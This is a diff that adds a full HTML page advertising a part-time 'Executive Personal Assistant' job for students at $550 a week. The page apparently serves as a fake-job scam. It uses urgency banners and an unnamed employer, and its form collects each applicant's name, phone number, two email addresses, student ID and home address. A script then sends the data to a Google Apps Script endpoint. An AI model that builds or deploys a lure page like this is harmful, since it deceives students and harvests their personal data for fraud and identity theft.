@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Executive Assistant Job | Student Opportunity</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(to right, #1e3c72, #2a5298);
+      color: #fff;
+      padding: 20px;
+
+      .header-image {
+  width: 100%;
+  max-height: 280px;
+  object-fit: cover;
+  border-radius: 15px;
+  margin-bottom: 20px;
+  display: block;
+}
+    }
+
+    .container {
+      background: rgba(255, 255, 255, 0.1);
+      backdrop-filter: blur(15px);
+      border-radius: 15px;
+      padding: 30px;
+      max-width: 800px;
+      margin: auto;
+      box-shadow: 0 0 20px rgba(0,0,0,0.3);
+    }
+
+    .header-image {
+      width: 100%;
+      border-radius: 12px;
+      margin-bottom: 20px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.4);
+    }
+
+    h1 {
+      font-size: 30px;
+      text-align: center;
+      color: #ffe600;
+    }
+
+    .tagline {
+      font-size: 18px;
+      margin-bottom: 15px;
+      color: #e0e0e0;
+      text-align: center;
+    }
+
+    .urgent {
+      background-color: #ff0033;
+      padding: 8px 15px;
+      border-radius: 8px;
+      display: inline-block;
+      margin: 10px auto;
+      text-align: center;
+      font-weight: bold;
+    }
+
+    ul {
+      padding-left: 20px;
+    }
+
+    li {
+      margin-bottom: 10px;
+    }
+
+    .highlight {
+      color: #00ffcc;
+      font-weight: bold;
+    }
+
+    form {
+      margin-top: 30px;
+      background: rgba(255, 255, 255, 0.15);
+      border-radius: 12px;
+      padding: 20px;
+    }
+
+    label {
+      display: block;
+      margin-top: 15px;
+      font-weight: 600;
+      color: #fff;
+    }
+
+    input, textarea, select {
+      width: 100%;
+      padding: 10px;
+      margin-top: 5px;
+      border-radius: 6px;
+      border: none;
+      font-size: 14px;
+      background: #fff;
+      color: #000;
+      box-sizing: border-box;
+    }
+
+    textarea {
+      resize: vertical;
+    }
+
+    button {
+      background-color: #ffe600;
+      color: #000;
+      border: none;
+      border-radius: 10px;
+      padding: 15px 20px;
+      font-size: 18px;
+      cursor: pointer;
+      margin-top: 20px;
+      width: 100%;
+      transition: background 0.3s ease;
+    }
+
+    button:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+    }
+
+    button:hover:enabled {
+      background-color: #fff;
+    }
+
+    .footer-note {
+      font-size: 13px;
+      color: #ccc;
+      margin-top: 20px;
+      text-align: center;
+    }
+
+    #confirmationMessage {
+      display: none;
+      padding: 40px;
+      background: #1a5a1a;
+      border-radius: 15px;
+      text-align: center;
+      max-width: 600px;
+      margin: 50px auto;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+
+    #confirmationMessage h2 {
+      color: #d4edda;
+      font-weight: 700;
+    }
+
+    #confirmationMessage p {
+      color: #c3e6cb;
+      font-size: 18px;
+      margin-top: 10px;
+      line-height: 1.4;
+    }
+
+    #loadingSpinner {
+      display: none;
+      text-align: center;
+      margin-top: 20px;
+    }
+
+    .spinner {
+      border: 5px solid #f3f3f3;
+      border-top: 5px solid #ffe600;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+      margin: 0 auto;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+  <img src="student.jpg" alt="Student job opportunity" class="header-image" />
+
+    <h1>🔥 Staff & Student Employment Opportunity</h1>
+    <p class="tagline">Become an <span class="highlight">Executive Personal Assistant</span> — Work from Home or School!</p>
+
+    <div class="urgent">🚨 Limited Spots Left – Apply Now!</div>
+
+    <p><strong>Employment Type:</strong> <span class="highlight">Part-Time</span></p>
+    <p><strong>Compensation:</strong> <span class="highlight">$550/week</span></p>
+
+    <p>
+      🎓 As a student, managing finances can be tough. Here's your chance to earn <span class="highlight">$550 weekly</span> doing light, flexible tasks at home or school, for just 2 hours a day!
+    </p>
+
+    <p><strong>Responsibilities:</strong></p>
+    <ul>
+      <li>📅 Scheduling and calendar management</li>
+      <li>📂 Filing and organizing documents</li>
+      <li>🔍 Basic research and responding to emails</li>
+      <li>📞 Light communication and note taking</li>
+    </ul>
+
+    <p><strong>Perks After Joining:</strong></p>
+    <ul>
+      <li>🛡️ AD&D Insurance</li>
+      <li>💰 401(k) Plan after 3 months</li>
+      <li>🏥 Free medicals after 1 month</li>
+      <li>🚀 Weekly pay increases with time</li>
+    </ul>
+
+    <form id="applicationForm">
+      <label for="fullname">Full Name</label>
+      <input type="text" name="Full Name" id="fullname" required>
+
+      <label for="phone">Phone Number</label>
+      <input type="tel" name="Phone Number" id="phone" pattern="[0-9]{10,}" required>
+
+      <label for="collegeEmail">College/University Email</label>
+      <input type="email" name="College Email" id="collegeEmail" required>
+
+      <label for="personalEmail">Personal Email</label>
+      <input type="email" name="Personal Email" id="personalEmail" required>
+
+      <label for="studentId">Student ID Number</label>
+      <input type="text" name="Student ID Number" id="studentId" required>
+
+      <label for="address">Present Local Address</label>
+      <textarea name="Mailing Address" id="address" rows="3" required></textarea>
+
+      <label for="major">Major / Field of Study</label>
+      <input type="text" name="Major" id="major" required>
+
+      <label for="year">Year in School</label>
+      <select id="year" name="Year" required>
+        <option value="">Select...</option>
+        <option value="Freshman">Freshman</option>
+        <option value="Sophomore">Sophomore</option>
+        <option value="Junior">Junior</option>
+        <option value="Senior">Senior</option>
+        <option value="Graduate">Graduate</option>
+      </select>
+      <button type="submit" id="submitBtn">🚀 Submit Application</button>
+    </form>
+
+    <div id="loadingSpinner"><div class="spinner"></div></div>
+
+    <div class="footer-note">
+      Applications are reviewed daily. Submit early to secure your spot!
+    </div>
+  </div>
+
+  <div id="confirmationMessage">
+    <h2>Application Successfully Submitted</h2>
+    <p>
+      Thank you for your application to the <strong>Executive Personal Assistant</strong> position.<br />
+      Our Human Resources team will carefully review your submission and contact you shortly via email and text message.<br />
+      Please ensure your contact information is accurate.<br /><br />
+      We appreciate your interest and wish you success in your academic and professional endeavors.
+    </p>
+  </div>
+
+  <script>
+    document.getElementById("applicationForm").addEventListener("submit", function (e) {
+      e.preventDefault();
+      const form = e.target;
+      const data = new FormData(form);
+      const scriptURL = "https://script.google.com/macros/s/AKfycbxLQ22TxeHNhEzSW1rYCahksXoTQUYbAO6lJf1n35HgG67ffpEmUajfA2X5tiukf0Y/exec";
+      const submitBtn = document.getElementById("submitBtn");
+      const spinner = document.getElementById("loadingSpinner");
+      const container = document.querySelector(".container");
+
+      const phone = document.getElementById("phone").value;
+      if (!/^[0-9]{10,}$/.test(phone)) {
+        alert("Please enter a valid phone number with at least 10 digits.");
+        return;
+      }
+
+      submitBtn.disabled = true;
+      spinner.style.display = "block";
+
+      fetch(scriptURL, { method: "POST", body: data })
+        .then(response => {
+          form.reset();
+          container.style.display = "none";
+          spinner.style.display = "none";
+          submitBtn.disabled = false;
+          document.getElementById("confirmationMessage").style.display = "block";
+          window.scrollTo({ top: 0, behavior: "smooth" });
+        })
+        .catch(error => {
+          spinner.style.display = "none";
+          submitBtn.disabled = false;
+          alert("Something went wrong. Please try again later.");
+          console.error("Error!", error.message);
+        });
+    });
+  </script>
+</body>
+</html>
